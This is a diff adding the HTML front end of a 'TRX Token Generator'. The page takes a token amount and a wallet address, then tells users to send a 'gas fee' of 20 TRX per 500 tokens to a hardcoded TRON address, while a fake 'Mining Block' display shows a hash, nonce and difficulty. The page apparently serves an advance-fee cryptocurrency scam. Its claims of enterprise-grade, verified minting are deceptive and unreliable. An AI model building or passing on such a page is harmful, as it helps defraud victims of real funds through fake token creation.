@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRX Token Generator - Professional Token Creation Tool</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lucide/0.263.1/umd/lucide.min.css">
+</head>
+<body>
+    <div class="page-container">
+        <div class="generator-card">
+            <!-- Header Section -->
+            <div class="card-header">
+                <h1 class="main-title">TRX Token Generator</h1>
+                <p class="subtitle">Enterprise-grade blockchain token generation platform with advanced security and minimal transaction fees</p>
+            </div>
+
+            <!-- Configuration Section -->
+            <div class="section">
+                <h2 class="section-title">Token Configuration</h2>
+                
+                <!-- Token Amount Input -->
+                <div class="form-group">
+                    <label for="tokenAmount" class="form-label">Token Amount</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="number" 
+                            id="tokenAmount" 
+                            class="form-input" 
+                            value="500" 
+                            min="500" 
+                            max="750000" 
+                            step="500"
+                            placeholder="Enter token amount"
+                        >
+                        <div class="input-suffix">TRX</div>
+                    </div>
+                    
+                    <!-- Slider -->
+                    <div class="slider-container">
+                        <input 
+                            type="range" 
+                            id="tokenSlider" 
+                            class="slider" 
+                            min="500" 
+                            max="750000" 
+                            value="500" 
+                            step="500"
+                        >
+                        <div class="slider-labels">
+                            <span class="slider-min">500</span>
+                            <span class="slider-max">750,000</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TRX Address Input -->
+                <div class="form-group">
+                    <label for="trxAddress" class="form-label">TRX Wallet Address</label>
+                    <input 
+                        type="text" 
+                        id="trxAddress" 
+                        class="form-input" 
+                        placeholder="Enter your TRX wallet address"
+                        maxlength="34"
+                    >
+                    <div class="input-hint">Tokens will be minted directly to this verified TRX address</div>
+                </div>
+
+                <!-- Gas Fee Display -->
+                <div class="gas-info" id="gasInfo" style="display: none;">
+                    <div class="gas-header">
+                        <span class="gas-icon">⚡</span>
+                        <span class="gas-title">Gas Fee Address</span>
+                    </div>
+                    <div class="gas-address">TUqzCMaBVbDwhcbcSAuk6CccqkVnDuuN34</div>
+                    <div class="gas-note">Transaction processing fees are directed to this secure wallet address</div>
+                    <div class="gas-action">
+                        <button id="copyGasAddress" class="copy-btn">
+                            <i data-lucide="copy" class="copy-icon"></i>
+                            <span>Copy to Clipboard</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Summary Section -->
+            <div class="section">
+                <h2 class="section-title">Transaction Summary</h2>
+                
+                <div class="summary-items">
+                    <div class="summary-item">
+                        <span class="summary-label">Token Amount</span>
+                        <span class="summary-value" id="summaryTokenAmount">500</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Fee Rate</span>
+                        <span class="summary-value">20 TRX per 500 tokens</span>
+                    </div>
+                    <div class="summary-divider"></div>
+                    <div class="summary-item summary-total">
+                        <span class="summary-label">Total Gas Fee</span>
+                        <span class="summary-value" id="summaryTotalFee">20 TRX</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Generate Button -->
+            <div class="action-section">
+                <button id="generateBtn" class="generate-btn" disabled>
+                    <i data-lucide="zap" class="btn-icon"></i>
+                    <span class="btn-text">Generate Token</span>
+                </button>
+                
+                <!-- Progress Bar -->
+                <div id="progressContainer" class="progress-container" style="display: none;">
+                    <div class="mining-header">
+                        <span class="mining-icon">⛏️</span>
+                        <span class="mining-title">Mining Block</span>
+                        <span class="mining-timer" id="miningTimer">00:00</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div id="progressFill" class="progress-fill"></div>
+                    </div>
+                    <div class="progress-text" id="progressText">Initializing...</div>
+                    <div class="mining-details" id="miningDetails">
+                        <div class="detail-item">
+                            <span class="detail-label">Block Hash:</span>
+                            <span class="detail-value" id="blockHash">Generating...</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Nonce:</span>
+                            <span class="detail-value" id="nonceValue">0</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Difficulty:</span>
+                            <span class="detail-value" id="difficultyValue">Calculating...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status Messages -->
+            <div id="statusMessages" class="status-messages"></div>
+        </div>
+    </div>
+
+    <!-- Toast Notifications -->
+    <div id="toastContainer" class="toast-container"></div>
+    
+    <!-- Mining Background Animation -->
+    <div id="miningBackground" class="mining-background"></div>
+
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
